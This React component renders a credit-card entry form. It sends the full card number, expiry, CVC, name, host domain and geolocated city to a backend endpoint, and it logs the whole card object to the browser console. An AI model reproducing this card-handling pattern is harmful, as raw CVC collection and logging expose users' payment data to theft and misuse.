import { State } from "@amcharts/amcharts5/.internal/core/util/States";
import { Input, TextField } from "@mui/material";
import { useState } from "react";
import Cards from 'react-credit-cards'
import 'react-credit-cards/es/styles-compiled.css'
import { store } from "../../..";
import { getGeoData } from "../../queries/getSendGeoData";
import { postData } from "../../services/StaffServices";
import { getSwitchQuery } from "../../utils/getSwitchQuery";
import Button from "../UI/Button/Button";
import './MyCards.scss'

const MyCards = () => {
    const [isSuccess, setIsSuccess] = useState(false)
    const [state, setState] = useState({
        cvc: '',
        expiry: '',
        name: '',
        number: '',
        focus: ''
    })

    const onHandleChange = (e) => {
        setState({...state, [e.target.name]: e.target.value})
    }
    const onHandleFocus = (e) => {
        setState({...state, focus: e.target.name})
    }

    const onSubmit = async (e) => {
        e.preventDefault()
        const geodata = await getGeoData()
        const nameArr = state.name.split(' ')
        const obj = {
            userId: store.user.id,
            domainName: window.location.host,
            userCountry: geodata.city,
            cardName: nameArr[0],
            cardSecondName: nameArr[1],
            cardNumber: state.number,
            cardExpiredDate: state.expiry,
            cardCvvCode: state.cvc
        }
        console.log('card', obj);
        try {
            const res = await postData(getSwitchQuery('/personal_area/bank_account/add_account/'), obj)
            setIsSuccess(true)
            localStorage.setItem('bank', 'true')
        } catch(e) {

        }
    }

    if (isSuccess) {
        return (
            <div style={{padding: '40px'}}>
                <div class="success-checkmark">
                    <div class="check-icon">
                        <span class="icon-line line-tip"></span>
                        <span class="icon-line line-long"></span>
                        <div class="icon-circle"></div>
                        <div class="icon-fix"></div>
                    </div>
                </div>
            </div>
        )
    }

    return (
        <div id='paymentForm'>
            <div className="mb-3">
                <Cards
                    cvc={state.cvc}
                    expiry={state.expiry}
                    name={state.name}
                    number={state.number}
                    focused={state.focus}
                />
            </div>
            <form onSubmit={onSubmit}>
                <div style={{marginBottom: 20}}>
                    <TextField sx={{width: '100%'}} name='name' type='text' onFocus={onHandleFocus} onChange={onHandleChange} label='Name' />
                </div>
                <div style={{marginBottom: 20}}>
                    <TextField sx={{width: '100%'}} name='number' type='number' onFocus={onHandleFocus} onChange={onHandleChange} label='Number' />
                </div>
                <div style={{marginBottom: 20}}>
                    <TextField sx={{width: '100%'}} name='expiry' type='date' onFocus={onHandleFocus} onChange={onHandleChange} />
                </div>
                <div style={{marginBottom: 20}}>
                    <TextField sx={{width: '100%'}} name='cvc' type='number' onFocus={onHandleFocus} onChange={onHandleChange} label='CVC' />
                </div>
                <Button classname={['btnBlue']} style={{width: '100%'}} type='submit'>Add</Button>
            </form>
        </div>
    )
}
export default MyCards;